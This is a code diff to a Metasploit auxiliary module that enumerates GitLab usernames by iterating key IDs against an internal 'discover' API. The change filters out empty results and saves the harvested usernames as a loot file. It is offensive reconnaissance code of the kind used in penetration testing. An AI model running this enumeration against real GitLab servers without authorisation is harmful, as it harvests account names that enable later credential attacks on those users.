@@ -77,6 +77,7 @@ class Metasploit3 < Msf::Auxiliary
 
     discover = normalize_uri(target_uri.path, internal_api, 'discover')
 
+    users = ''
     print_status("Enumerating user keys #{datastore['START_ID']}-#{datastore['END_ID']}...")
     datastore['START_ID'].upto(datastore['END_ID']) do |id|
       res = send_request_cgi(
@@ -88,8 +89,12 @@ class Metasploit3 < Msf::Auxiliary
       if res && res.code == 200 && res.body
         begin
           user = JSON.parse(res.body)
-          print_good("Key-ID: #{id} Username: #{user['username']} Name: #{user['name']}")
-          store_username(user['username'], res)
+          username = user['username']
+          unless username.nil? || username.to_s.empty?
+            print_good("Key-ID: #{id} Username: #{username} Name: #{user['name']}")
+            store_username(username, res)
+            users << "#{username}\n"
+          end
         rescue JSON::ParserError
           print_error("Key-ID: #{id} - Unexpected response body: #{res.body}")
         end
@@ -99,6 +104,23 @@ class Metasploit3 < Msf::Auxiliary
         print_error('Connection timed out...')
       end
     end
+
+    unless users.nil? || users.to_s.empty?
+      store_userlist(users)
+    end
+  end
+
+  def store_userlist(users)
+    name = datastore['SSL'] ? 'https' : 'http'
+    service = report_service(
+      :host  => rhost,
+      :port => rport,
+      :name => name,
+      :proto => 'tcp'
+    )
+
+    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'Gitlab Users', service)
+    print_good("Userlist stored at #{loot}")
   end
 
   def store_username(username, res)
